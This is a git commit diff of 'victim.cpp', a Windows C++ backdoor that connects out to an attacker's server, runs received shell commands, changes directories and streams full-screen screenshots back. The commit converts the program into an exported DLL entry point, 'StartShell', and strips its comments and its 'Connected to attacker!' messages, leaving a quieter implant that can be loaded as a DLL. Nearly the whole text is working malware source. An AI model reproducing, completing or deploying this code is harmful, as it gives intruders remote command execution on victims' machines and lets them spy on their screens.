c7fd8daf0f46e831dd735ac3d3f8d61e02709f72
danielsv03 <daniels5@kth.se>
2025-03-27 23:34:44 +0100

    dasd
    da

--- src/victim.cpp
+++ src/victim.cpp
@@ -16,6 +16,8 @@
 
 using namespace std;
 
+extern "C" __declspec(dllexport) void StartShell();  // Expose function for DLL
+
 // Initialize Winsock
 void initializeWinsock() {
     WSADATA wsa;
@@ -28,7 +30,6 @@ void initializeWinsock() {
 // Function to capture screenshot of all monitors and send data over socket
 void takeScreenshot(SOCKET sock) {
     #ifdef _WIN32
-        // Capture all screens
         int screenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
         int screenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
         int screenLeft = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -40,7 +41,6 @@ void takeScreenshot(SOCKET sock) {
         SelectObject(hDC, hBitmap);
         BitBlt(hDC, 0, 0, screenWidth, screenHeight, hScreen, screenLeft, screenTop, SRCCOPY);
 
-        // Prepare bitmap headers
         BITMAPFILEHEADER fileHeader;
         BITMAPINFOHEADER infoHeader;
         BITMAP bmp;
@@ -48,9 +48,9 @@ void takeScreenshot(SOCKET sock) {
 
         infoHeader.biSize = sizeof(BITMAPINFOHEADER);
         infoHeader.biWidth = bmp.bmWidth;
-        infoHeader.biHeight = -bmp.bmHeight; // Negative to store it right-side-up
+        infoHeader.biHeight = -bmp.bmHeight;
         infoHeader.biPlanes = 1;
-        infoHeader.biBitCount = 32; // 32-bit for high quality
+        infoHeader.biBitCount = 32;
         infoHeader.biCompression = BI_RGB;
         infoHeader.biSizeImage = bmp.bmWidth * bmp.bmHeight * 4;
         infoHeader.biXPelsPerMeter = 0;
@@ -58,41 +58,28 @@ void takeScreenshot(SOCKET sock) {
         infoHeader.biClrUsed = 0;
         infoHeader.biClrImportant = 0;
 
-        fileHeader.bfType = 0x4D42; // 'BM' signature
+        fileHeader.bfType = 0x4D42;
         fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + infoHeader.biSizeImage;
         fileHeader.bfReserved1 = 0;
         fileHeader.bfReserved2 = 0;
         fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
-        // Allocate memory for raw image data
         int imageSize = bmp.bmWidth * bmp.bmHeight * 4;
         char* imageData = new char[imageSize];
 
-        // Get raw bitmap data
         GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, imageData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
 
-        // Send file size first (header + image data)
         uint32_t totalSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
         uint32_t sizeNetworkOrder = htonl(totalSize);
         send(sock, (char*)&sizeNetworkOrder, sizeof(sizeNetworkOrder), 0);
-
-        // Send the BMP headers first
         send(sock, (char*)&fileHeader, sizeof(BITMAPFILEHEADER), 0);
         send(sock, (char*)&infoHeader, sizeof(BITMAPINFOHEADER), 0);
-
-        // Send the actual image data
         send(sock, imageData, imageSize, 0);
 
-        // Cleanup
         delete[] imageData;
         DeleteObject(hBitmap);
         DeleteDC(hDC);
         ReleaseDC(NULL, hScreen);
-
-        std::cout << "Screenshot sent to attacker!" << std::endl;
-    #else
-        std::string errorMessage = "Screenshot functionality is not available on this operating system.";
-        send(sock, errorMessage.c_str(), errorMessage.length(), 0);
     #endif
 }
 
@@ -100,23 +87,23 @@ void takeScreenshot(SOCKET sock) {
 string executeCommand(const string& command) {
     char buffer[BUFFER_SIZE];
     string result = "";
-    
+
     FILE* pipe = _popen(command.c_str(), "r");
     if (!pipe) return "Failed to execute command";
-    
+
     while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
         result += buffer;
     }
     _pclose(pipe);
-    
+
     if (result.empty()) {
         result = "Command executed, but no output.";
     }
-    
+
     return result;
 }
 
-int main() {
+extern "C" __declspec(dllexport) void StartShell() {
     initializeWinsock();
 
     SOCKET sock;
@@ -128,7 +115,7 @@ int main() {
     if (sock == INVALID_SOCKET) {
         cerr << "Socket creation failed" << endl;
         WSACleanup();
-        return -1;
+        return;
     }
 
     // Configure server address
@@ -141,13 +128,11 @@ int main() {
         cerr << "Connection failed" << endl;
         closesocket(sock);
         WSACleanup();
-        return -1;
+        return;
     }
 
-    cout << "Connected to attacker!" << endl;
-
     char cwd[MAX_PATH];
-    GetCurrentDirectory(MAX_PATH, cwd); // Get working directory
+    GetCurrentDirectory(MAX_PATH, cwd);
 
     while (true) {
         memset(buffer, 0, BUFFER_SIZE);
@@ -159,19 +144,16 @@ int main() {
             break;
         }
 
-        // Exit command
         if (strcmp(buffer, "exit") == 0) {
             cout << "Exit command received, closing..." << endl;
             break;
         }
 
-        // Screenshot command (fix function call)
         if (strcmp(buffer, "screenshot") == 0) {
             takeScreenshot(sock);
             continue;
         }
 
-        // Change directory command
         if (strncmp(buffer, "cd ", 3) == 0) {
             char* dir = buffer + 3;
             if (SetCurrentDirectory(dir)) {
@@ -183,12 +165,10 @@ int main() {
             continue;
         }
 
-        // Execute command
         string commandResult = executeCommand(buffer);
         send(sock, commandResult.c_str(), commandResult.length(), 0);
     }
 
     closesocket(sock);
     WSACleanup();
-    return 0;
 }
